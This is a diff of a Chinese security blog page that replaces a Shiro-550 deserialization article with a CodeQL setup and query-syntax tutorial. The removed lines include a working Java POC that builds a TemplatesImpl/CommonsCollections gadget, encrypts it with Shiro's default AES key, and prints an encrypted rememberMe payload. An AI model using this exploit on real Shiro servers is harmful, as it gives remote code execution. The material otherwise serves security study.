@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>六月的雨</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="六月的雨">
+  <title>java代码审计-codeql学习 | 六月的雨</title>
+  <meta name="keywords" content=" Hexo , Markdown ">
+  <meta name="description" content="java代码审计-codeql学习 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="inxedu_cms前言   因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.">
 <meta property="og:type" content="article">
@@ -710,22 +710,41 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Java反序列化-Shiro分析" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-java代码审计-codeql" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">java代码审计-codeql学习</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="JAVA代码审计">JAVA代码审计</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">Hexo</a>
+            
+            <a class="color4">Markdown</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-30 16:45:32'>2021-12-14 16:18</time>
+            Created At : <time class="date" title='Updated At: 2022-01-19 16:47:02'>2021-09-07 23:22</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.2k</span>
+        <span>Count:3.8k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -755,7 +774,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro550"><span class="toc-text">Java反序列化-Shiro550</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Shiro550%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">0x01 Shiro550漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BD%BF%E7%94%A8-TemplatesImpl%E6%9E%84%E9%80%A0%E4%B8%8D%E5%90%AB%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget"><span class="toc-text">0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Commons-Beanutils%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x03 Commons Beanutils利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%9F%BA%E4%BA%8ETomcat%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8%E8%BF%9B%E8%A1%8C%E5%9B%9E%E6%98%BE%EF%BC%88%E4%BD%86shiro%E4%B8%8D%E5%87%BA%E7%BD%91%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%8F%AF%E9%80%9A%E8%BF%87%E5%9B%9E%E6%98%BE%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%ADkey%E5%AD%98%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%89"><span class="toc-text">0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shiro721"><span class="toc-text">0x04 shiro721</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-text">0x04 权限绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shiro%E6%A1%86%E6%9E%B6-key%E7%88%86%E7%A0%B4"><span class="toc-text">0x04 shiro框架 key爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-text">0x05 总结</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#codeql%E5%AD%A6%E4%B9%A0"><span class="toc-text">codeql学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81VSCode%E4%B8%8ACodeQL%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88%E6%88%91%E7%95%99%E7%9A%84%E6%88%AA%E5%9B%BE%E5%8F%AA%E6%9C%89windows%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8linux%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%90%AD%E5%BB%BA%EF%BC%89"><span class="toc-text">一、VSCode上CodeQL的环境配置（我留的截图只有windows，建议使用linux环境进行搭建）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A6%96%E5%85%88%E5%9C%A8%E6%8F%92%E4%BB%B6%E5%BA%93%E4%B8%AD%E6%89%BE%E5%88%B0codeql%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85"><span class="toc-text">（1）首先在插件库中找到codeql插件安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%B8%8B%E8%BD%BDCodeQL-CLI%E7%8E%AF%E5%A2%83"><span class="toc-text">（2）下载CodeQL CLI环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E4%B8%8B%E8%BD%BDQL%E5%BA%93%E6%96%87%E4%BB%B6"><span class="toc-text">（3）下载QL库文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">（4）配置环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F"><span class="toc-text">（5）测试是否配置成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">（6）创建数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-text">（7）创建数据库报错解决方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CodeQl%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0"><span class="toc-text">二、CodeQl语法学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E7%A1%80"><span class="toc-text">（1）基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%B1%BB%E5%BA%93"><span class="toc-text">（2）类库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%8F%98%E9%87%8FType"><span class="toc-text">（3）变量Type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95-%E8%BF%99%E9%87%8C%E5%86%99%E7%9A%84%E6%AF%94%E8%BE%83%E6%9D%82%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E6%8A%8A%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%B3%95%E6%95%B4%E5%90%88%E8%B5%B7%E6%9D%A5%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%90%8E%E7%BB%AD%E6%9F%A5%E7%9C%8B"><span class="toc-text">（4）常见方法(这里写的比较杂，主要是把一些常见的方法整合起来，方便后续查看)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E8%B0%93%E8%AF%8D"><span class="toc-text">（5）谓词</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-text">（6）污点分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%887%EF%BC%89%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-text">（7）案例分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -771,320 +790,480 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>title: Java反序列化-Shiro分析<br>date: 2021-12-11 15:38:12<br>tags:</p>
+        <h1 id="codeql学习"><a href="#codeql学习" class="headerlink" title="codeql学习"></a>codeql学习</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CodeQL 的整体思路是把源代码转化成一个可查询的数据库，通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库。CodeQL 的数据库并没有使用现有的数据库技术，而是一套基于文件的自己的实现。</p>
+<h2 id="一、VSCode上CodeQL的环境配置（我留的截图只有windows，建议使用linux环境进行搭建）"><a href="#一、VSCode上CodeQL的环境配置（我留的截图只有windows，建议使用linux环境进行搭建）" class="headerlink" title="一、VSCode上CodeQL的环境配置（我留的截图只有windows，建议使用linux环境进行搭建）"></a>一、VSCode上CodeQL的环境配置（我留的截图只有windows，建议使用linux环境进行搭建）</h2><h3 id="（1）首先在插件库中找到codeql插件安装"><a href="#（1）首先在插件库中找到codeql插件安装" class="headerlink" title="（1）首先在插件库中找到codeql插件安装"></a>（1）首先在插件库中找到codeql插件安装</h3><p><img src="https://image.3001.net/images/20210418/1618722147_607bbd63178c2f42e17b9.png!small?1618722149648" alt="1618722147_607bbd63178c2f42e17b9.png!small?1618722149648"></p>
+<h3 id="（2）下载CodeQL-CLI环境"><a href="#（2）下载CodeQL-CLI环境" class="headerlink" title="（2）下载CodeQL CLI环境"></a>（2）下载CodeQL CLI环境</h3><p>CodeQL CLI是CodeQL的命令行接口，VSCode的CodeQL插件需要CodeQL CLI提供编译和命令查询的环境，安装好CodeQL CLI之后，就可以使用QL文件对目标代码进行分析，所以称CodeQL CLI为CodeQL的分析程序。</p>
+<p>CodeQL CLI下载地址：</p>
+<pre><code>https://github.com/github/codeql-cli-binaries/releases
+</code></pre>
+<p>下载完之后对压缩包进行解压</p>
+<h3 id="（3）下载QL库文件"><a href="#（3）下载QL库文件" class="headerlink" title="（3）下载QL库文件"></a>（3）下载QL库文件</h3><p>除了分析程序，想要运行QL代码，还需要相应的库文件，下载地址：</p>
+<pre><code>https://github.com/github/codeql/releases
+</code></pre>
+<h3 id="（4）配置环境变量"><a href="#（4）配置环境变量" class="headerlink" title="（4）配置环境变量"></a>（4）配置环境变量</h3><p>将库文件和分析程序放到系统盘，注意两者要放到同一个文件夹目录下。设置分析程序的环境变量。环境变量的设置方法请自行百度。</p>
+<p><img src="https://image.3001.net/images/20210418/1618722155_607bbd6baa7db8269c447.png!small?1618722158139" alt="1618722155_607bbd6baa7db8269c447.png!small?1618722158139"></p>
+<h3 id="（5）测试是否配置成功"><a href="#（5）测试是否配置成功" class="headerlink" title="（5）测试是否配置成功"></a>（5）测试是否配置成功</h3><p>在命令行输入codeql，看环境变量是否配置成功：</p>
+<p><img src="https://image.3001.net/images/20210418/1618722201_607bbd99270e538ed5f37.png!small?1618722203849" alt="1618722201_607bbd99270e538ed5f37.png!small?1618722203849"></p>
+<h3 id="（6）创建数据库"><a href="#（6）创建数据库" class="headerlink" title="（6）创建数据库"></a>（6）创建数据库</h3><pre><code>codeql database create j --language=java  --command=&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot; --source-root=./javasec
+</code></pre>
+<p>source-root 为源码路径，默认为当前目录,可不指定</p>
+<p>一些常用命令</p>
+<pre><code> 跳过测试，构建
+ --command=&quot;mvn clean install --file pom.xml -Dmaven.test.skip=true&quot;
+ 无论项目结果如何,构建从不失败
+ codeql database create skywalkdb  --language=java --command=&quot;mvn -fn clean install --file pom.xml -Dmaven.test.skip=true&quot;
+</code></pre>
+<h3 id="（7）创建数据库报错解决方法"><a href="#（7）创建数据库报错解决方法" class="headerlink" title="（7）创建数据库报错解决方法"></a>（7）创建数据库报错解决方法</h3><p>windows报错解决不了，有师傅知道可以告诉下我。所以我换了kali环境。</p>
+<p>解决方法：</p>
+<p>codeql database create javadb –language=java  –command=’mvn clean install -Dmaven.test.skip=true’</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220114140023016.png" alt="image-20220114140023016"></p>
+<p>编译会报错的，可以加-fn忽略编译错误</p>
+<p>codeql database create javadb –language=java –command=”mvn -fn clean install –file pom.xml -Dmaven.test.skip=true”</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220114152304333.png" alt="image-20220114152304333"></p>
+<p>（8）到VSCode中将生成的javadb导入，然后就可以编写ql文件进行测试了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20220119164121129.png" alt="image-20220119164121129"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20220119164208624.png" alt="image-20220119164208624"></p>
+<h2 id="二、CodeQl语法学习"><a href="#二、CodeQl语法学习" class="headerlink" title="二、CodeQl语法学习"></a>二、CodeQl语法学习</h2><h3 id="（1）基础"><a href="#（1）基础" class="headerlink" title="（1）基础"></a>（1）基础</h3><pre><code class="sql">import &lt;language&gt; /* 导入对应的语言包 */
+
+/* 可能存在的 一些谓词 类的设置 */
+
+from /* 声明变量等 */
+where /* 设置逻辑表达式 */
+select /* 打印结果 */
+</code></pre>
+<h3 id="（2）类库"><a href="#（2）类库" class="headerlink" title="（2）类库"></a>（2）类库</h3><p>我们经常会用到的ql类库大体如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Method</td>
+<td align="center">方法类，Method method表示获取当前项目中所有的方法</td>
+</tr>
+<tr>
+<td align="center">MethodAccess</td>
+<td align="center">方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用</td>
+</tr>
+<tr>
+<td align="center">Parameter</td>
+<td align="center">参数类，Parameter表示获取当前项目当中所有的参数</td>
+</tr>
+</tbody></table>
+<p>Call ：</p>
+<p>call.getArgument(0) call的第一个参数</p>
+<p>call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(“java.net”, “URL”)  call的调用者（一个构造器）</p>
+<p>ConstructorCall .getArgument(1)   指new的对象，取第二个参数</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220118183544458.png" alt="image-20220118183544458"></p>
+<p>Class</p>
+<p>FieldAccess</p>
+<p>Field</p>
+<p>Method和MethodAccess区别：</p>
+<p>Method：</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220118180749405.png" alt="image-20220118180749405"></p>
+<p>Method类中的常用的方法:</p>
+<p>method.getName() 获得该方法的所有方法</p>
+<p>method.getDeclaringType() 获得方法的所属class的名称</p>
+<p>method.getParameter(0) 获取方法的第一个参数</p>
+<p>MethodAccess：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20220118181146871.png" alt="image-20220118181146871"></p>
+<p>MethodAcces.getArgument(0) 获取方法的第一个参数</p>
+<p>method.getMethod().hasName(“write”)  设置调用的方法是write</p>
+<p>method.getMethod().getDeclaringType().hasName(“IOUtil”)   设置调用write方法的对象是IOUtil类</p>
+<p>method.getArgument(0).getType().hasName(“File”)  设置第一位参数是File参数</p>
+<p>获取 MethodAccess 的参数</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getATypeArgument.0.html">getATypeArgument</a>获取作为此方法访问的一部分提供的类型参数（如果有）。<br><a target="_blank" rel="noopener" href="https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getAnArgument.0.html">getAnArgument</a> 获取提供给使用此方法访问调用的方法的参数。<br><a target="_blank" rel="noopener" href="https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getArgument.1.html">getArgument(int n)</a> 获取此方法访问中指定（从零开始）位置的参数。</p>
+<p><a target="_blank" rel="noopener" href="https://help.semmle.com/qldoc/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getTypeArgument.1.html">getTypeArgument(int n)</a> 获取此方法访问中指定（从零开始）位置的类型参数（如果有）。</p>
+</blockquote>
+<h3 id="（3）变量Type"><a href="#（3）变量Type" class="headerlink" title="（3）变量Type"></a>（3）变量Type</h3><p>拥有很多子类：</p>
 <ul>
-<li>Hexo</li>
-<li>Markdown<br>categories: Java安全</li>
+<li>PrimitiveType ：描述Java语言中的8个基础类型 boolean byte char double float int long short 外带null+void</li>
+<li>RefType：引用类型（也就是非基础类型），拥有如下子类：<ul>
+<li>Class ： 类Class</li>
+<li>Interface：接口</li>
+<li>EnumType：枚举</li>
+<li>Array：数组</li>
+<li>TopLevelType：表示在编译单元顶层声明的类型 （声明类型）</li>
+<li>NestedType：在一个type内部声明的type</li>
+<li>TopLevelClass：表示在编译单元顶层声明的类</li>
+<li>NestedType：在另一个type中声明的类<ul>
+<li>LocalClass：在一个method或者constructor中定义的类</li>
+<li>AnonymousClass：匿名类</li>
 </ul>
-<h1 id="Java反序列化-Shiro550"><a href="#Java反序列化-Shiro550" class="headerlink" title="Java反序列化-Shiro550"></a>Java反序列化-Shiro550</h1><h2 id="0x01-Shiro550漏洞原理"><a href="#0x01-Shiro550漏洞原理" class="headerlink" title="0x01 Shiro550漏洞原理"></a>0x01 Shiro550漏洞原理</h2><p>1.1    漏洞原理：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密<br>Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</p>
-<pre><code>获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作
-</code></pre>
-<p>PS：Tomcat对类加载的处理，如果反序列化流中包含非java自身的数组，则会导致无法加载类的错误。所以我们没法使用Transformer数组。</p>
-<p>影响版本：&lt; 1.7.0</p>
-<h2 id="0x02-使用-TemplatesImpl构造不含数组的反序列化Gadget"><a href="#0x02-使用-TemplatesImpl构造不含数组的反序列化Gadget" class="headerlink" title="0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget"></a>0x02 使用 TemplatesImpl构造不含数组的反序列化Gadget</h2><p>2.1    利用链：</p>
-<pre><code>HashMap.readObject
-    TiedMapEntry.hashCode
-    TiedMapEntry.getValue
-        LazyMap.get
-            InvokeTransformer.transformer
-                TemplatesImpl.newTransformer
-            TemplatesImpl.getTransletInstance
-            TemplatesImpl.defineTransletClasses
-</code></pre>
-<p>这里的shiro环境使用的是P牛的，使用的是maven很方便：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
-<p>2.2    POC：</p>
-<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import javassist.ClassPool;
-import javassist.CtClass;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.Map;
-
-public class CommonsCollectionsShiroTest &#123;
-
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
-        Field field = obj.getClass().getDeclaredField(fieldName);
-        field.setAccessible(true);
-        field.set(obj, value);
-    &#125;
-
-
-    public byte[] getPayload() throws Exception &#123;
-
-
-        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
-
-        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
-        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
-        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
-        CtClass payload=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
-        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
-        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
-        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
-
-        TemplatesImpl templates = new TemplatesImpl();
-        Field bytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
-        bytecodes.setAccessible(true);
-        bytecodes.set(templates, new byte[][]&#123;bytes&#125;);
-
-
-
-        Field name = templates.getClass().getDeclaredField(&quot;_name&quot;);
-        name.setAccessible(true);
-        name.set(templates,&quot;HelloTemplatesImpl&quot;);
-
-
-        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;getClass&quot;,null,null);//为什么
-        HashMap hashMap = new HashMap();
-        Map decorate = LazyMap.decorate(hashMap,invokerTransformer);
-
-
-
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,templates);
-
-        HashMap expMap = new HashMap();
-        expMap.put(tiedMapEntry,&quot;vavava&quot;);
-
-        decorate.clear();
-        Field iMethodName = invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);
-        iMethodName.setAccessible(true);
-        iMethodName.set(invokerTransformer,&quot;newTransformer&quot;);
-
-        ByteArrayOutputStream barr = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(barr);
-        oos.writeObject(expMap);
-        oos.close();
-
-        return barr.toByteArray();
-
-    &#125;
-&#125;
-</code></pre>
-<p>测试类：</p>
-<pre><code>public class Client2 &#123;
-    public static void main(String []args) throws Exception &#123;
-
-        byte[] payloads = new CommonsCollectionsShiroTest().getPayload();
-        AesCipherService aes = new AesCipherService();
-        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
-
-        ByteSource ciphertext = aes.encrypt(payloads, key);
-        System.out.printf(ciphertext.toString());
-    &#125;
-&#125;
-</code></pre>
-<p>运行测试类,复制字节码，启动shiro环境。构造数据包进行发包。</p>
-<p>字节码：</p>
-<pre><code>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
-</code></pre>
